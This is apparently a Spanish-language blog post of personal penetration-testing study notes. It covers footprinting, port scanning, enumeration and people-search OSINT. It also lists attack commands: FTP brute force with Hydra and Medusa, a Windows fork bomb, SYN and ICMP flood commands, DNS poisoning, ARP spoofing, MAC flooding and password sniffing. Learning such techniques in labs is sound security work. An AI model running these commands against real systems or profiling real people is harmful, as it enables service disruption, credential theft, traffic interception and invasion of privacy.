---
title: "Ethical hacking"
date: 2024-07-24T22:57:44-03:00
tags: ['hacking']
---
## Footprinting
Es una técnica que se usa para juntar la máxima cantidad de información posible acerca de un target en específico para aprovechar la parte más vulnerable del sistema para atacar.
#### Búsqueda de subdominios.
Google dork: site google.com -inurl:www
O usando el comando sublist3r en kali: `sublist3r -d google.com`

### Obteniendo información sobre la empresa 
Podemos usar https://opencorporates.com para obtener direcciones, números de teléfonos, correos electrónicos, que tipo de servicios están dando, y demás información. Podemos filtrar por país y por diferentes tipos de información.
Podemos usar https://archive.com y google dorks para buscar capturas viejas de la página en búsqueda de alguna información jugosa.

### Creando un wordlists usando cewl
Podemos crear una wordlists (lista de palabras) usando el comando `cewl` por ejemplo creamos una wordlists de microsoft.com
`cewl -d 5 -m 3 -w wordlists.txt microsoft.com` creará una lista con todas las palabras que están presentes en esa página y lo guardará en el archivo wordlists.txt
`-d`: depth
`-m`: mínima longitud.

### https://whois.com/whois
Nos permitirá saber información acerca del dominio, quién lo registro, en el pasado la gente ponía información personal, correo, nro. de teléfono, etc. Hoy en día la mayoría tienen los datos en privado.

### https://whois.domaintools.com
Y acá podemos obtener información como direcciones IP, localizaciones de IP, historial de IPs, información del hosting.

### Si no encontrás información en whois

Podés mirar el historial de DNS, por si usaba algún DNS dominio viejo.   
Complete DNS Dns history - largest archive of dns record - domain history:  
[https://completedns.com/dns-history/](https://completedns.com/dns-history/)

Reverse IP (mirar otros sitios que usan la misma IP): [https://viewdns.info](https://viewdns.info)


### DNS Footprinting
Vamos a obtener la información de servidores DNS, los diferentes tipos de DNS.
`nslookup microsoft.com`
`ping microsoft.com`

### Para averiguar el principal servicio DNS:
`nslookup -type=soa microsoft.com`   


### Para averiguar servicio de correos:
`nslookup -query=MX microsoft.com`

### Listar todos los servidores de DNS del dominio
`nslookup -type=ns microsoft.com`

### También podemos usar el siguiente comando:
`dnsenum target.com` para hacerlo todo automático.

**Esta página contiene muchas herramientas, como por ejemplo Reverse IP domain check, lo que significa que vamos a buscar que otras páginas están corriendo en el mismo servidor que está hosteado nuestro target.**

`https://yougetsignal.com -> Reverse IP Domain Check`
Remote Address: microsoft.com

Muchas veces pasa que nuestro target es seguro entonces podemos intentar atacar a nuestro target principal accediendo por otras páginas que están en el mismo servidor.

### network footprinting
Podemos usar `advanced-ip-scanner` o directamente usar nmap para escanear las IPs que están dentro de una LAN.

#### escaneo de red
Buscaremos información sobre hosting, puertos, aplicaciones, servicios que se ejecuten en la red.

`hping3 192.168.0.1 --icmp -c 5 # ping`
#### Ahora vamos a escanear un puerto específico:
`hping3 192.168.0.1 --scan 22,80,443 -S`
#### Escaneamos un rango de puertos
`hping3 192.168.0.1 --scan 1-80 -S`

### Escaneo TCP
Buscaremos información como subdominios, puertos, whois lookups
Ejemplo:
`dmitry -p intranet 192.168.0.1 -o demo.txt`
### Búsqueda de puertos abiertos
`nmap -sS 192.168.0.1`
#### Si queremos escanear toda la red usaremos este comando
`nmap -sS 192.168.0.1/24`
#### Si queremos incrementar o disminuir la velocidad del escaneo usando nmap tenemos que usar el parámetro `T0-T5` (time). T5 es el más rápido.
`nmap 192.168.0.1 -T 5`

#### Usando fping para hacer un escaneo.
Para saber si una computadora o más computadora están "vivas".
`fping -g 192.168.0.1 192.168.0.103` 
##### Para escanear toda la red y saber cual computadora está prendida:
`fping -a -g 192.168.100.0/24 2> /dev/null`
##### Luego podemos buscar por puertos abiertos con nmap e indentificar el sistema operativo que usan con -O
`nmap -sS -O 192.168.100.201`

#### Zenmap
Es nmap con la parte gráfica y escaneos pre-configurados.

##### Como saber que sistema operativo está corriendo el target
Hacemos esto para poder encontrar un exploit.
Podemos usar `nmap -O ipaddr` o una herramienta llamada idserve en "Search Query" podemos el dominio o la IP que la podemos extraer haciendo un ping del target que estamos atacando, y nos dará información sobre el servidor.


### Enumeración
Que tipo de información podemos colectar usando este método.
- System Names
- Nombres de usarios y grupos
- Aplicaciones
- Servicios
- Tablas de enrutamiento
- Fully Qualify Domain Names

Usaremos este comando nmap: `nmap -sV -v --script nbstat.nse 192.168.0.13`
`-sV`: para determinar la versión de los servicios que están corriendo en los puertos abiertos de la IP.
`-v`: modo verbose
`--script`: Para usar un script específico

## Windows 
#### Escaneo
Podemos usar una herramienta llamada: `superscan` (para escanear computadoras con windows)

#### SNMP Enumeración
https://www.youtube.com/watch?v=iYUzMzYLsWw

Vamos a usar "SolarWinds" it managment tool.
https://www.youtube.com/watch?v=qt7XkD2Ly54

### NTP Enumeración
Protocolo para sincronizar el tiempo de los dispositivos en una red de computadoras.
Su función principal es asegurarse que todos los dispositivos en la red tienen consistentes información del tiempo.
##### Como funciona el protocolo NTP?
NTP opera intercambiando información de tiempo entre el cliente y los servidores. Usa una arquitectura jerárquica de servidores.
Vamos a usar el comando `ntdupdate` que es usado para sincronizar el tiempo del sistema con el servidor NTP.
Ejemplo: `ntpdate -q 192.168.0.1`
En la salida vemos `offset`, es la diferencia entre el tiempo local y el tiempo del servidor, `delay` es la latencia del servidor NTP.

Vamos a intentar sincronizar el tiempo con ese servidor usando el siguiente comando:
`ntpdate 192.168.0.1`  
`ntpdate -d 192.168.0.1`    
`-d`: debug mode

#### Ahora lo haremos usando nmap
Nmap contiene un script llamado ntp-info para obtener el tiempo y la configuración de nuestro servidor NTP.
`nmap -sU -p 123 --script ntp-info 192.168.0.1`

### Búsqueda de vulnerabilidades con nikto
`nikto -host 192.168.0.10`

### Auditoría de seguridad
Vamos a usar `lynis` diseñado para buscar vulnerabilidades en sistemas basados en unix y linux. 
`lynis audit system`


### Hydra
#### Atacar servicio ftp con un diccionario
`hydra -t 5 -V -f -l bee -P password.txt 192.168.0.10 ftp`   
`-l`: username

### Bomba fork en Windoze
forkbomb.bat
`%0|%0`

### Cain
Viejo método para bruteforcear contraseñas de usuarios de Windows

### Lazesoft
Una herramienta para copiar la información sin necesidad de utilizar ninguna contraseña, me parece que hay mejores alternativas.
Genera una iso de un so para obtener contraseñas de windows?

### Steganography

### anonsurf
Navegá a través de internet bajo tor usando iptables.

### freevpn
https://vpnbook.com/freevpn
`sudo openvpn vpnbook-us1-tcp443.ovpn`

### sniffing tools
wireshark
`ettercap -T | grep password` XDDD

### mac spoofing
Los paquetes serán enviados usando diferentes direcciones de mac.
`macof -i eth0 -n 100`
#### Mac flooding
`yersinia -G `   
`Lauch attack -> Floding CDP table -> flooding CDP table`:     
`List attack -> stop attack`
#### ataque DHCP (descubrimiento de ips)
`yersinia -G `   
`Lauch attack -> sending DISCOVER packet`
Abrí wireshark y accedé a tu interfaz de red, en la mayoría de los casos es eth0 si usas cable y wlan0 si estás conectado por wifi y verás los paquetes de dhcp que se están mandando a la red.
#### dns poisoning
`dnschef --fakeip=192.168.0.4 --fakedomains=microsoft.com --interface=0.0.0.0`
Tenés que hacer que la víctima use el dns 192.168.0.5
Si ejecutamos `nslookup microsoft.com` notaremos que la IP del servidor es `192.168.0.5`.
#### Como detectar sniffers.
El primer método es evitar usar protocolos inseguros como ftp y http, en cambio usar https y sftp.
En windows podemos usar `xarp`.
En linux con nmap: `nmap --script=sniffer-detect 192.168.0.5`
En los resultados dice: `Likely in promiscuous mode.`
### Ingeniería social.
Creación de emails engañosos para llevar al usuario a páginas maliciosas.
Hay muchos tipos de usuarios atacados por ingeniería social como: recepcionistas, IT helpdesk, HR Dept, Top Mgmt.
Agregar video 23.social engineering 

### Ataque DoS vs DDOS
### SYN Flooding Attack(más viejo que la mierda y no funciona para nada)
`hping3 -S 192.168.0.3 -a 192.168.0.5 -p 22 --flood`    
**Otra forma de hacerlo con metasploit**   
`systemctl start postgresql && msfdb init && sudo msfconsole `    
`msf> db_status`
`msf> use auxiliary/dos/tcp/synflood`
`msf> set RHOSTS 192.168.0.3`
`msf> set RPORT 21`
`msf> set SHOST 192.168.0.10`
`msf> set TIMEOUT 50000`
`msf> exploit`

Podemos ver los paquetes enviados con wireshark 
### icmp flood (más viejo que la mierda y no funciona para nada)
`hping3 -c 100 --icmp 192.168.0.3`
### ping of death (más viejo que la mierda y no funciona para nada)
`ping 192.168.0.3 -t -l 65500`


### Precauciones
Habilitar la limitación del enrutador
Usá reverse proxy.

### Session Hijacking
#### Capturando Cookies
#### Deshabilitar detención de portal cautivo 
https://detectportal.firefox.com   
`firefox -> about:config -> network.captive-portal-service.enabled -> false`

#### BurpSuite


Abrí burp suite, dejá la configuración por defecto, andá a la pestaña proxy, intercept -> insercept is off.
Entrá a http://localhost:8080 en el menú dale a CA-certificate , descargalo e importalo en chrome : `settings->privacy and security->security->manage certificates->authorities->import->all files->cacert.der`
Abrí `firefox settings->manual proxy configuration->localhost 8080 -> also use this for https`

O en chrome: `chromium --proxy-server="http://127.0.0.1:8080"`
Ahora dale a forward en el burp suite cada vez que visitás una página


Para captar las cookies usaremos una aplicación extremadamente vulnerable llamada **bWAPP**.

Abrimos bWAPP en firefox, y el burpsuite podemos ir viendo las consultas (request) que se hacen en siguiente(forward)

#### Enumeración usando HTTPrint.
Es una aplicacion de mierda de Windows para obtener información sobre el servidor, hay mejores alternativas.

#### skipfish
`skipfish -o /root/output http://192.168.0.10/bWAPP` te creará un index.html con toda la información sobre posibles vulnerabilidades directorios abiertos en esa ip.  
output es una carpeta. 
#### netcat
`nc -vv asdf.org 80`

### obtener la versión del servidor con metasploit
`msf > use auxiliary/scanner/http/http_version`    
`msf > set RHOSTS 192.168.0.10`    
`msf > set THREADS 10`    
`msf > run`    


`msf > use auxiliary/scanner/http/files_dir`
`msf > show options`
`msf > set RHOSTS 192.168.0.10`
`msf > run`


Lo mismo con `msf > use auxiliary/scanner/http/files_dir` para escanear por métodos disponibles en http (no sirve para nada)

**webDAV** Protocolo usado para crear y mover documentos en un servidor.

`msf > use auxiliary/scanner/http/webdav_scanner`

##### Website mirroring usando HTTPtrack
Para descargar la página entera en tu computadora, podemos usar wget curl en linux.

### bruteforce de aplicaciones web
`disbuster`

`medusa -h 192.168.0.10 -u bee -P passwords.txt -M ftp`

`webcruiser` escaner web de seguridad.

#### Honeypots
Mecanismos para atraer scriptkiddies y engañarlos: **Pentbox tool**

### buscadores 
metacrawler.com   

#### baidu.com las siguientes operaciones de búsquedas están soportadas:   

* site: 
* domain: 
* inurl: 
* allinurl: 
* intitle: 
* allintitle: 
* filetype: 
#### Sitios afiliados: 
www.baidu.jp , baidu thailand, egypt...

### yandex.com (el mejor para buscar piratería)    
`Mime="html/pdf/doc/ppt/xls/rtf/swf"`    

```
rhost:ro.*
rhost:edu.*
rhost:edu.* inurl:ftp
```

`lang=ru/uk/be/en/fr/de`    
`ballistics << lang="uk"` solo busca ballistics en páginas uk

#### bing
`linkfromdomain:` devuelve páginas que están enlazadas a un dominio
`contains: FILETYPE` retorna las páginas que CONTIENEN ese tipo de archivo.
Por ejemplo: `"SSH password" contains: xls`   
`filetype: FILETYPE` devuelve las páginas que fueron creadas con ese formato en específico   
`ip:` busca otras paginas en la misma IP.
`LOC:` retorna páginas de un específico país o región 

Ejemplo: 
`nslookup microsoft.com`   
Te dará la IP del dominio y podemos buscar por ip en bing `ip: ipaddr`
Y sí ejecutamos un nslookup a ese dominio que nos dió bing nos dará la misma IP.

##### Avanzadas operaciones bing:
https://msdn.microsoft.com/en-us/library/ff795620

#### búsquedas avanzadas de google.
Operadores: 
`and or - * "" `
```
allintext:
inurl:
allinurl:
intitle:
allintitle:
site:
filetype: 
link:
numrange:
daterange:
related:
cache:
info:
```
Google dorks:

https://www.exploit-db.com/google-hacking-database   

Si estás buscando gente podés usar las siguientes páginas:
pipl.com  
spokeo.com  
peekyou.com  
lullar.com  

### Love XD
badoo.com  
twoo.com  
adultfriendfinder.com  
nirvam.com    


### Paste sites
https://pastebin.com   
https://tinypaste.com  
https://pastie.com    

#### Wikipedia alerts

### Social Media
1. Facebook, twitter
2. myspace, orkut
3. instagram, flickr, vine, foursquare, youtube.
4. weibo, vkontakte, tuenti, qzone
5. linkedin

#### facebook graph search
Las consultas se hacen en lenguaje humano:
Ejemplo: "people who like solar power research", "people named Hans who live in Munich, Germany", "Friends of people who like solar power research".
```
People who are not my friend who like [PAGE NAME]
My friend who like [PAGE NAME]
Groups of people who like TOPIC and like [PAGE NAME]
Favorite interests of people who like [PAGE NAME]
Pages liked by people who like [PAGE NAME]
Pages liked by people who like [PAGE NAME] and [PAGE NAME]
Pages liked by PERSON or PAGE
Fans of [PAGE NAME] 1 and [PAGE NAME] 2
People who work at PLACE and like SOMETHING
Favorite interests of people who like [PAGE NAME 1] and [PAGE NAME 2]
```

#### Wappalyzer
Identifica el software que usa una página web.

#### Ataque de direccionario
Busca directorios abiertos:    
`dirb http://192.168.0.1/dvwa /usr/share/wordlists/dirb`   
`dirbuster`

### arpspoof
`arpspoof -i wlan0 -t 172.16.36.133 172.16.36.2`

### paros
`paros`

### nessus
Escaner de vulnerabilidades.

#### maltego

```bash
emailharvester -d gmail.com -e linkedin
```
emailharvester -d gmail.com -e linkedin





##### Escanear puertos a través de firewall
```bash
nmap -sS -v -v -Pn
nmap -sS -v -v -Pn -g
```

https://nmap.org/book/firewall-subversion.html

